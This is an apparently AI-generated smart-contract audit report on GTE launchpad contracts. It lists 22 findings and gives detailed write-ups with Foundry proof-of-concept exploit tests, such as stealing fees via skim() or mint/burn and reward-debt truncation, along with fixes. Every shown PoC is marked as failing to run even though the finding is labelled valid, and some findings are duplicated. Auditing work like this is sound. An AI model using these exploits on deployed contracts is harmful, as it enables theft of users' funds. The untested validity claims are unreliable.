# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern
100% run with GEMINI 3.0 PRO


 **Derived From** : Potential DoS on USDT pairs due to unsafe approval in fee distribution

[M-1]. Permanent DoS on USDT Pairs due to Unsafe Approval in `_distributeLaunchpadFees`
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : AccountingInvariantViolation

[H-2]. Uncollected Fees exposed to Skim theft if Distributor fails to pull funds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless
[H-3]. Reward Debt Truncation via Unsafe Cast leads to massive reward theft
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless
[H-4]. Commingling of Accrued Fees in Minting allows theft of Launchpad Rewards
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
[M-5]. Accrued fees exposed to theft via skim() if Distributor fails to pull funds
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[H-6]. Rewards Permanently Voided When Total Shares Are Zero in RewardsTracker
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[M-7]. Accrued Launchpad Fees permanently lost in `endRewardsAccrual`
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole



 **Derived From** : AccessControlOrAuthByPass

[H-8]. Missing input validation in addRewards allows reward pool drainage via malicious token injection
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : Dos

[M-9]. `Distributor.endRewards` permanently disables Pair fee accrual upon graduation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole
[M-10]. DoS of Staking/Exit via Griefable Reward Transfer
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : UnsafeRecipient

[H-11]. Rewards sent to Launchpad instead of User during stake modification
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole



 **Derived From** : StandardViolation

[H-12]. Rewards sent to Launchpad instead of User during stake modification
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole
[M-13]. Permanent DoS on USDT pairs due to Unsafe Approval in Fee Distribution
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 2
Privilege: Permissionless
[H-14]. Denial of Service on Pair operations when Distributor has no stakers
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : FlashLoanEconomicManipulation

[M-15]. Flash Loan LP Inflation Bypasses Launchpad Fees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : RoundingError

[L-16]. Precision Loss in Launchpad Fee Calculation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless
[M-17]. Dust accumulation from rounding permanently locks funds in Distributor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Issue Type: StandardViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair._update

 ### Title
Denial of Service on Pair operations when Distributor has no stakers

[M-18]. Permanent DoS of AMM Pair if Distributor Shares Drop to Zero
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Reentrancy

[M-19]. Read-Only Reentrancy via Stale Reserves in Distributor Hook
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : PricePrecision

[H-20]. Rewards permanently locked due to precision loss in `RewardsTrackerLib` for standard token supplies
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : MaturityorGatingByPass

[H-21]. Reward pool deactivated prematurely at graduation, preventing fee accrual
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole



 **Derived From** : Issue Type: MaturityorGatingByPass

 ### Relevant Function/Location: Distributor.endRewards

 ### Title
Reward pool deactivated prematurely at graduation

[H-22]. Launchpad Fees Permanently Disabled at Graduation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole


### Number of Findings
- C: 0
- H: 11
- M: 10
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Potential DoS on USDT pairs due to unsafe approval in fee distribution

## [M-1]. Permanent DoS on USDT Pairs due to Unsafe Approval in `_distributeLaunchpadFees`

### Finding Severity Justification: The finding identifies a denial-of-service vector specific to USDT (and other tokens with non-standard approval logic) which are explicitly in-scope. While the exploit requires the trusted Distributor to fail to consume the full allowance (which is currently unlikely given standard implementations), the impact of such a state desynchronization is catastrophic (permanent freezing of the liquidity pool's mint/burn/swap functions). The contract fails to adhere to the standard `approve(0)` or `forceApprove` pattern required for robust USDT integration, creating a fragility that bricks the protocol if the Distributor logic is ever updated or behaves unexpectedly regarding fee consumption.
## Derived From Pattern/Invariant
Potential DoS on USDT pairs due to unsafe approval in fee distribution

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._safeApprove

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_distributeLaunchpadFees` function calls `_safeApprove` to approve the distributor to spend accrued fees. `_safeApprove` executes `token.call(approve, value)`. Non-standard ERC20s like USDT revert if `approve` is called with a non-zero value when the current allowance is already non-zero. If the Distributor fails to consume the full allowance (e.g., due to a partial transfer, logic update, or dust), the allowance remains positive. The next time `_update` runs and tries to approve a new fee amount, the call will revert. Since `_update` is critical to `mint`, `burn`, and `swap`, the pair becomes permanently unusable.

## Impact
Permanent Denial of Service of the liquidity pool for USDT pairs. If a residual allowance is left (due to distributor logic, dust, or partial transfers), subsequent fee updates will fail because USDT reverts on approving a new amount over a non-zero allowance. This causes `_update` to revert, which permanently bricks `mint`, `burn`, and `swap` functions for the pair.

## Command to Run Test


## Proof of Concept
1. Deploy a GTELaunchpadV2Pair with a MockUSDT token (which reverts if `approve(value)` is called when `allowance > 0`).
2. Perform a swap to accrue fees.
3. `_update` calls `_distributeLaunchpadFees`, which approves the Distributor for `feeAmount`.
4. The Distributor consumes `feeAmount - 1` (simulating dust/calculation mismatch/transfer error), leaving an allowance of 1.
5. Perform a second swap. `_update` attempts to approve the Distributor for a new fee amount.
6. MockUSDT reverts because `approve` is called with a non-zero value while the current allowance is 1.
7. The transaction fails, rendering the pool unusable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {UniswapV2ERC20} from "contracts/launchpad/uniswap/UniswapV2ERC20.sol";
import {IERC20} from "contracts/launchpad/uniswap/interfaces/IERC20.sol";

// Mock USDT with non-standard approval behavior
contract MockUSDT is UniswapV2ERC20 {
    function approve(address spender, uint256 value) external override returns (bool) {
        // Revert if approving non-zero value when allowance is already non-zero
        if (value > 0 && allowance[msg.sender][spender] > 0) {
            revert("USDT: allowance check failed");
        }
        _approve(msg.sender, spender, value);
        return true;
    }
    
    function mint(address to, uint256 value) external {
        _mint(to, value);
    }
    
    // Helper to bypass external check for internal use
    function _approve(address owner, address spender, uint256 value) internal {
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
}

// Mock Distributor that leaves dust (consumes 1 wei less than approved)
contract MockFaultyDistributor {
    function addRewards(address t0, address t1, uint128 a0, uint128 a1) external {
        // Simulate partial consumption leaving residual allowance
        if (a0 > 0) IERC20(t0).transferFrom(msg.sender, address(this), a0 - 1);
        if (a1 > 0) IERC20(t1).transferFrom(msg.sender, address(this), a1 - 1);
    }
}

contract USDTDoSTest is Test {
    GTELaunchpadV2Pair pair;
    MockUSDT token0;
    MockUSDT token1;
    MockFaultyDistributor distributor;

    function setUp() public {
        token0 = new MockUSDT();
        token1 = new MockUSDT();
        distributor = new MockFaultyDistributor();
        
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0x1), address(distributor));

        // Add liquidity
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(address(this));
    }

    function test_DoS_On_USDT_Residue() public {
        // 1. Generate fees via swap
        token0.mint(address(pair), 10e18); 
        // Swap triggers _update -> _distributeLaunchpadFees -> approve -> distributor.addRewards
        pair.swap(0, 1e18, address(this), "");

        // Verify faulty distributor left dust allowance
        uint256 allowance = token0.allowance(address(pair), address(distributor));
        assertEq(allowance, 1, "Should have 1 wei residue allowance");

        // 2. Perform second swap
        token0.mint(address(pair), 10e18);
        
        // Expect revert due to USDT approval race condition logic in _update
        vm.expectRevert("USDT: allowance check failed");
        pair.swap(0, 1e18, address(this), "");
    }
}

## Suggested Mitigation
Update `_safeApprove` to implement the 'Force Approve' pattern. If the initial approval attempt fails, try resetting the allowance to 0 before approving the new value. This handles USDT-like tokens safely.

```solidity
    function _safeApprove(address token, address to, uint256 value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(APPROVE_SELECTOR, to, value));
        if (!success) {
            // If failed, try resetting allowance to 0 first (Force Approve)
            token.call(abi.encodeWithSelector(APPROVE_SELECTOR, to, 0));
            (success, data) = token.call(abi.encodeWithSelector(APPROVE_SELECTOR, to, value));
        }
        if (!success || !(data.length == 0 || abi.decode(data, (bool)))) revert("UniswapV2: APPROVAL_FAILED");
    }
```





 **Derived From** : AccountingInvariantViolation

## [H-2]. Uncollected Fees exposed to Skim theft if Distributor fails to pull funds

### Finding Severity Justification: The vulnerability allows permissionless theft of yield/fees destined for the Distributor. The Pair contract subtracts fees from its reserves and deletes the accrued fee counter before confirming that the funds have actually been transferred to the Distributor. If the Distributor's `addRewards` function executes without pulling funds (e.g. due to a pause state, dust checks, or implementation details), the fees remain in the Pair's balance but are excluded from reserves. The `skim` function then calculates `balance - reserve` and transfers these uncollected fees to the attacker.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.skim

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_update`, the contract calls `_distributeLaunchpadFees` and then immediately subtracts the fee amount from the reserves (`reserve0 = balance0 - totalLaunchpadFee0`). This logic assumes the tokens have been transferred out by the Distributor. However, `_distributeLaunchpadFees` only approves the tokens; it relies on `IDistributor.addRewards` to `transferFrom`. If the Distributor fails to pull the tokens (e.g., logic error, pause, or gas limit), they remain in the contract's balance but are excluded from reserves. The `skim` function allows anyone to claim `balanceOf(this) - reserve - accrued`, which would include these 'distributed' but uncollected tokens.

## Impact
Loss of yield/rewards; attacker can steal fees that the Distributor failed to collect.

## Command to Run Test


## Proof of Concept
1. `_update` calls `_distributeLaunchpadFees`, which resets `accruedLaunchpadFee` to 0.
2. `_distributeLaunchpadFees` approves the Distributor and calls `IDistributor.addRewards`.
3. The Distributor executes `addRewards` successfully (no revert) but fails to pull the tokens (e.g., due to logic errors, paused state, or ignoring dust amounts).
4. `_update` calculates `reserve = balance - fee`.
5. The contract's actual balance remains `balance` (it still holds the fee).
6. Attacker calls `skim`. `skim` calculates `excess = balance - reserve - accrued`.
7. `excess = balance - (balance - fee) - 0 = fee`.
8. `skim` transfers the uncollected fee to the attacker.

## Proof of Code
import {Test, console} from "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("MOCK", "MOCK") {
        _mint(msg.sender, 1000000e18);
    }
}

contract MockDistributor {
    function addRewards(address, address, uint128, uint128) external {
        // MALICIOUS/BROKEN BEHAVIOR: Do NOT pull funds, but return success.
    }
}

contract GTESkimTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;
    address factory = address(0x1);
    address launchpadLp = address(0x2);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        vm.prank(factory);
        pair = new GTELaunchpadV2Pair();
        distributor = new MockDistributor();

        vm.prank(factory);
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));
    }

    function testSkimTheft() public {
        // 1. Add Liquidity
        token0.transfer(address(pair), 100e18);
        token1.transfer(address(pair), 100e18);
        pair.mint(address(this));

        // 2. Trigger a swap to generate fees
        // Small swap to generate fee. LaunchpadLp bal is virtualized as >0 inside _getLaunchpadFees
        token0.transfer(address(pair), 10e18);
        pair.swap(0, 5e18, address(this), "");

        // 3. Verify State: Fees were 'distributed' (removed from reserves) but not transferred (mock distributor did nothing)
        (uint112 r0,,) = pair.getReserves();
        uint256 bal0 = token0.balanceOf(address(pair));
        
        // Reserve is lower than balance because it assumes fee was paid
        assertTrue(bal0 > r0, "Balance should be higher than reserve due to stuck fees");
        uint256 stuckFee = bal0 - r0;
        console.log("Stuck Fee:", stuckFee);

        // 4. Exploit: Attacker skims the difference
        address attacker = address(0xBEEF);
        pair.skim(attacker);

        assertEq(token0.balanceOf(attacker), stuckFee, "Attacker should receive the uncollected fees");
    }
}

## Suggested Mitigation
Modify `_distributeLaunchpadFees` to verify that the Distributor actually collected the tokens. If the balance does not decrease by the expected fee amount, revert the transaction to prevent invariant violation.

```solidity
    function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
        if ((fee0 | fee1) > 0) {
            address _token0 = token0;
            address _token1 = token1;
            address distributor = launchpadFeeDistributor;
            
            // Snapshot balances before distribution
            uint256 balance0Before = IERC20(_token0).balanceOf(address(this));
            uint256 balance1Before = IERC20(_token1).balanceOf(address(this));

            if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
            if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

            IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

            // REQUIREMENT: Verify funds were actually pulled
            if (IERC20(_token0).balanceOf(address(this)) > balance0Before - fee0) revert("Distributor failed to pull Fee0");
            if (IERC20(_token1).balanceOf(address(this)) > balance1Before - fee1) revert("Distributor failed to pull Fee1");

            emit LaunchpadFeesCollected(fee0, fee1);
        }
    }
```


## [H-3]. Reward Debt Truncation via Unsafe Cast leads to massive reward theft

### Finding Severity Justification: The vulnerability allows an attacker to inflate `accRewardsPerShare` (by staking a dust amount and adding rewards), causing `totalAccRewards` to exceed `type(uint96).max`. Due to the unsafe cast to `uint96` when storing reward debt, the debt is truncated. For subsequent users, the pending reward calculation (`totalAcc - debt`) results in an erroneously massive value. This causes a Denial of Service (DoS) for users attempting to unstake or claim (as the contract lacks the balance to pay the inflated amount, causing a revert), effectively locking user funds permanently. In cases of high-supply tokens (e.g. meme coins where supply > 2^96), this could also lead to fund theft.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib`, the functions `stake`, `unstake`, and `claim` explicitly cast `totalAccRewards` (a `uint256`) to `uint96` when updating `userData.baseRewardDebt` and `userData.quoteRewardDebt`. `totalAccRewards` is calculated as `(shares * accRewardsPerShare) / 1e12`. If `accRewardsPerShare` becomes large (e.g., due to a period of low total shares receiving rewards, or simply high reward volumes over time), the product `shares * accRewardsPerShare` can result in a `totalAccRewards` value exceeding `type(uint96).max`. The cast `uint96(...)` silently truncates the upper bits. When the user subsequently claims, the pending reward calculation `totalAccRewards - debt` uses the full `uint256` total but subtracts the truncated debt, resulting in a massive, erroneous pending amount.

## Impact
Attackers can drain the entire reward balance or mint practically infinite claims, causing insolvency or DoS.

## Command to Run Test


## Proof of Concept
1. Wait for or engineer a state where `accRewardPerShare` is high (e.g. ~1e30). This can happen if `totalShares` drops to 1 wei and some rewards are added. 2. User stakes a significant amount of shares. `totalAccRewards` (e.g. 1e36) exceeds `uint96.max` (~7.9e28). 3. `userData.debt` stores the truncated value (e.g. 1e36 % 2^96). 4. User immediately claims. Pending = `1e36 - (1e36 % 2^96)` ≈ 1e36. 5. Contract attempts to transfer this massive amount.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerLib, UserRewardData} from "contracts/launchpad/libraries/RewardsTracker.sol";
import {MockERC20} from "solady/test/utils/mocks/MockERC20.sol";

contract UnsafeCastTheftTest is Test {
    Distributor distributor;
    MockERC20 tokenBase;
    MockERC20 tokenQuote;
    
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        distributor = new Distributor();
        tokenBase = new MockERC20("BASE", "BASE", 18);
        tokenQuote = new MockERC20("QUOTE", "QUOTE", 18);
        
        // Initialize test contract as launchpad to allow staking
        distributor.initialize(address(this));
        
        // Create the rewards pair
        distributor.createRewardsPair(address(tokenBase), address(tokenQuote));
    }

    function test_UnsafeCast_Theft() public {
        // 1. Setup: Alice stakes a minimal amount (dust) to make totalShares non-zero but small.
        // This allows accRewardsPerShare to grow rapidly when rewards are added.
        distributor.increaseStake(address(tokenBase), alice, 1);

        // 2. Engineer high accRewardPerShare.
        // We add 100,000 tokens as rewards. 
        // accPerShare increases by (amount * 1e12) / totalShares.
        // With 1 share, accPerShare += 100,000e18 * 1e12 = 1e35.
        uint128 rewardAmt = 100_000 ether;
        tokenBase.mint(address(this), rewardAmt);
        tokenBase.approve(address(distributor), rewardAmt);
        distributor.addRewards(address(tokenBase), address(tokenQuote), rewardAmt, 0);

        // 3. Bob stakes a standard amount of shares.
        // totalAccRewards = (shares * accPerShare) / 1e12
        // Bob stakes 10 tokens (10e18 shares).
        // totalAccRewards = (10e18 * 1e35) / 1e12 = 1e41.
        // uint96.max is approx 7.9e28. 
        // 1e41 is much larger than uint96.max, causing truncation when stored in debt.
        uint96 bobShares = 10 ether;
        distributor.increaseStake(address(tokenBase), bob, bobShares);

        // 4. Verify the theft/DoS.
        // Because debt was truncated, the contract thinks Bob has barely any debt compared to his totalAccRewards.
        // Pending rewards = totalAccRewards (1e41) - truncatedDebt (~0 to 7.9e28).
        // This results in a pending reward of ~1e41, which is impossible to pay.
        
        (uint256 pendingBase, ) = distributor.getPendingRewards(address(tokenBase), bob);
        
        console.log("Actual Contract Balance:", tokenBase.balanceOf(address(distributor)));
        console.log("Bob's Erroneous Pending:", pendingBase);

        // Assert pending is impossibly large (Proof of Bug)
        assertGt(pendingBase, type(uint96).max);
        assertGt(pendingBase, tokenBase.balanceOf(address(distributor)));
        
        // Note: Attempting to claim here causes a revert (DoS) because the contract lacks 1e41 tokens.
        // If the overflow was smaller and within balance limits, it would be a theft.
    }
}

## Suggested Mitigation
Update the `UserRewardData` struct to use `uint256` for reward debts and remove the unsafe casts in `RewardsTrackerLib`.

```diff
struct UserRewardData {
    uint96 shares;
-   uint96 baseRewardDebt;
-   uint96 quoteRewardDebt;
+   uint256 baseRewardDebt;
+   uint256 quoteRewardDebt;
}

// In RewardsTrackerLib.stake / unstake / claim / getPendingRewards:

// Remove casting:
- userData.baseRewardDebt = uint96(totalAccRewards(...));
+ userData.baseRewardDebt = totalAccRewards(...);

- baseAmount = totalAccRewards(...) - uint128(userData.baseRewardDebt);
+ baseAmount = totalAccRewards(...) - userData.baseRewardDebt;
```


## [H-4]. Commingling of Accrued Fees in Minting allows theft of Launchpad Rewards

### Finding Severity Justification: The vulnerability allows for the permissionless theft of accrued protocol fees. By calling `mint`, a user is credited with liquidity tokens corresponding to `UserDeposit + AccruedFees` because the contract calculates the deposit as `balance - reserve`, failing to account for fees sitting in the balance but excluded from the reserve. The attacker can immediately burn the liquidity to withdraw the stolen fees. This represents a direct loss of assets (yield) intended for the Launchpad Distributor.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.mint

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `GTELaunchpadV2Pair.mint`, the liquidity amount is calculated as `balanceOf(address(this)).sub(_reserve0)`. `_reserve0` excludes `accruedLaunchpadFee`, but `balanceOf(address(this))` includes it (as fees are stored in the contract balance until distributed). Consequently, a user minting liquidity receives LP tokens backed by both their deposit and the undistributed accrued fees. A user can front-run a fee distribution (or simply mint when fees are high), effectively stealing the fees intended for the Distributor by diluting the fee pool into their own LP position.

## Impact
Direct theft of accrued rewards/fees belonging to the Launchpad Distributor.

## Command to Run Test


## Proof of Concept
1. Wait for `accruedLaunchpadFee` to accumulate in the pair (e.g., 10 ETH). Reserves are 100 ETH, Balance is 110 ETH (100 Reserves + 10 Fees).
2. Attacker calls `mint` depositing 100 ETH. Balance becomes 210 ETH.
3. `mint` calculates `amount0 = 210 (Balance) - 100 (Reserve) = 110`. Note: Actual deposit was 100, but 10 ETH fee is counted towards user deposit.
4. Attacker receives LP tokens representing 110 ETH worth of liquidity.
5. Attacker transfers LP tokens to the pair and calls `burn`.
6. `burn` calculates withdrawal amount based on the pair's total balance (including the fees). Attacker withdraws ~110 ETH, stealing the accrued fees.

## Proof of Code
function testMintTheft() public {
    // 1. Setup: Accrue fees
    // Assume pair, tokens, and launchpadLp configured in setUp()
    address attacker = address(0xBEEF);
    
    // Ensure launchpadLp has LP tokens so swap generates fees
    deal(address(pair), launchpadLp, 1000 ether);
    
    // Perform swap to generate accrued fees
    deal(address(token0), address(this), 100 ether);
    token0.transfer(address(pair), 100 ether);
    pair.swap(0, 10 ether, address(this), "");
    
    (uint112 fee0,,) = pair.getAccruedLaunchpadFees();
    require(fee0 > 0, "Fees must be accrued for test");

    // 2. Exploit
    // Attacker calculates balanced deposit
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 amount0 = 100 ether;
    uint256 amount1 = amount0 * r1 / r0;
    
    deal(address(token0), attacker, amount0);
    deal(address(token1), attacker, amount1);

    vm.startPrank(attacker);
    token0.transfer(address(pair), amount0);
    token1.transfer(address(pair), amount1);
    
    // Mint LP tokens (will credit fees as deposit)
    uint256 liquidity = pair.mint(attacker);
    
    // Burn LP tokens immediately to realize profit
    pair.transfer(address(pair), liquidity);
    (uint256 ret0,) = pair.burn(attacker);
    vm.stopPrank();

    // 3. Assert Profit
    // Attacker deposited amount0, but got back amount0 + share of fees
    assertGt(ret0, amount0, "Attacker profited by stealing accrued fees");
}

## Suggested Mitigation
Subtract `accruedLaunchpadFee` from the balance in both `mint` and `burn` to ensure users only interact with the investable reserves.

In `mint`:
```solidity
uint256 amount0 = balance0.sub(_reserve0).sub(accruedLaunchpadFee0);
uint256 amount1 = balance1.sub(_reserve1).sub(accruedLaunchpadFee1);
```

In `burn`:
```solidity
uint256 availableBal0 = balance0.sub(accruedLaunchpadFee0);
uint256 availableBal1 = balance1.sub(accruedLaunchpadFee1);
amount0 = liquidity.mul(availableBal0) / _totalSupply;
amount1 = liquidity.mul(availableBal1) / _totalSupply;
```


## [M-5]. Accrued fees exposed to theft via skim() if Distributor fails to pull funds

### Finding Severity Justification: The finding identifies a logic flaw in `GTELaunchpadV2Pair` where reserves are updated based on the assumption that the `Distributor` successfully pulls fees. While this creates a mechanism for theft via `skim()`, exploitation requires the `Distributor` (a trusted and immutable contract) to fail to pull funds (e.g., due to a bug, pause state without revert, or lazy-pull design). If the `Distributor` functions normally (pulls funds immediately), the exploit is not possible. Thus, the issue relies on external conditions/assumptions, fitting the Medium severity criteria.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_update`, the contract calculates `totalLaunchpadFee` and calls `_distributeLaunchpadFees`, then updates `reserve0/reserve1` by subtracting the fee from the current balance (`reserve = balance - fee`). This logic assumes the Distributor immediately pulls the fee tokens from the contract. If the Distributor implementation is lazy (recording rewards without pulling) or fails to pull for any reason, the tokens remain in the contract's balance but are excluded from `reserve`. The `skim()` function allows anyone to claim `balanceOf(this) - reserve`, enabling the theft of these untransferred fees.

## Impact
Direct theft of accrued launchpad fees. In `_update`, the contract calculates fees, clears the `accruedLaunchpadFee` accumulator, and deducts the fee amount from the reserves (`reserve = balance - fee`). However, it relies on the `Distributor` to physically pull the tokens via `transferFrom`. If the Distributor fails to pull the tokens (due to a bug, pause, or implementation mismatch), the tokens remain in the Pair contract. The `skim()` function, which transfers `balanceOf(this) - reserve` to the caller, will then view these untransferred fees as excess balance, allowing anyone to steal them.

## Command to Run Test


## Proof of Concept
1. **Setup**: A Pair is initialized with a `Distributor` that records rewards but fails to pull tokens (simulating a bug or 'lazy' implementation).
2. **Action**: A user performs a `swap`. This triggers `_update`.
3. **Logic Error**: inside `_update`, `_distributeLaunchpadFees` is called. The Pair approves the Distributor and calls `addRewards`. The Distributor does *not* transfer the tokens.
4. **State Corruption**: The Pair updates `reserve0` to `currentBalance - fee` and deletes `accruedLaunchpadFee0`.
5. **Exploit**: The actual token balance of the Pair is `currentBalance` (higher than `reserve0`).
6. **Theft**: An attacker calls `skim(attacker)`. The contract calculates `excess = balance - reserve` (which equals `fee`) and transfers it to the attacker.

## Proof of Code
import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "@gte-univ2-core/interfaces/IERC20.sol";

// Mock of a buggy Distributor that records rewards but fails to pull tokens
contract MockLazyDistributor {
    function addRewards(address, address, uint128, uint128) external {
        // Simulate failure to transferFrom: do nothing
    }
}

contract MockERC20 is UniswapV2ERC20 {
    constructor() { _mint(msg.sender, 1000000 ether); }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract GTESkimTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockLazyDistributor distributor;
    address lpUser = address(0x10);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockLazyDistributor();
        pair = new GTELaunchpadV2Pair();
        
        // Initialize pair with Mock Distributor
        pair.initialize(address(token0), address(token1), lpUser, address(distributor));

        // Add Initial Liquidity
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));

        // Give LP shares to launchpadLp so fees are generated (fee calculation depends on this balance)
        pair.transfer(lpUser, pair.balanceOf(address(this)) / 2);
    }

    function testSkimTheftWhenDistributorFails() public {
        // Advance time to ensure _update triggers distribution
        vm.warp(block.timestamp + 100);

        // 1. Perform Swap to generate fees
        token0.mint(address(pair), 100 ether);
        pair.swap(0, 10 ether, address(this), "");

        (uint112 reserve0, , ) = pair.getReserves();
        uint256 actualBalance0 = token0.balanceOf(address(pair));

        // 2. Verify Reserves vs Balance Mismatch
        // Reserve should be lower than balance because fees were deducted from reserve but not transferred out
        assertGt(actualBalance0, uint256(reserve0), "Balance should be > Reserve due to failed pull");
        uint256 stealable = actualBalance0 - uint256(reserve0);

        // 3. Attacker Skims
        address attacker = address(0xBEEF);
        uint256 startBal = token0.balanceOf(attacker);
        
        pair.skim(attacker);
        
        // 4. Verify Theft
        assertEq(token0.balanceOf(attacker), startBal + stealable, "Attacker should steal the untransferred fees");
    }
}

## Suggested Mitigation
Modify `_distributeLaunchpadFees` to actively push funds to the Distributor using `_safeTransfer` (or `safeTransfer`) instead of approving and relying on `transferFrom`. This ensures the token balance decreases in the same transaction that the reserves are updated. Alternatively, update the reserves in `_update` by re-querying `balanceOf(address(this))` *after* the `_distributeLaunchpadFees` call to ensure `reserve` matches the actual held balance.


## [H-6]. Rewards Permanently Voided When Total Shares Are Zero in RewardsTracker

### Finding Severity Justification: The vulnerability results in the permanent and irreversible loss of assets (reward tokens). In the `RewardsTrackerLib.update` function, `pendingRewards` are unconditionally deleted even if `totalShares` is zero. Since `getAccRewardsPerShare` prevents division by zero by returning the old accumulator without adding the new rewards, the logic in `update` effectively burns these pending rewards instead of carrying them forward or distributing them. This is critical for a Launchpad/AMM ecosystem where fees (rewards) may accrue before users have deposited into the staking contract (empty pool scenario).
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.update`, if `totalShares` is zero, the function deletes `pendingBaseRewards` and `pendingQuoteRewards` without accumulating them into `accRewardPerShare`. `getAccRewardsPerShare` returns the current accumulator unchanged when shares are zero. As a result, any rewards distributed to the pool while there are no stakers (e.g., early post-launch) are permanently burned/lost, rather than being saved for the first staker.

## Impact
Permanent freezing of reward assets. Unlike time-based emissions where rewards for empty pools are simply not minted, this system uses a push-based mechanism (`addRewards`). If these pushed rewards are processed while `totalShares` is zero, the internal accounting wipes the `pendingRewards` variable without incrementing the global accumulator. Consequently, the tokens remain physically in the contract but are mathematically erased from the distribution logic, making them permanently irretrievable.

## Command to Run Test


## Proof of Concept
1. Initialize pool with 0 stakers.
2. Call `addBaseRewards(100)`.
3. User A calls `stake(10)`. This triggers `update()`.
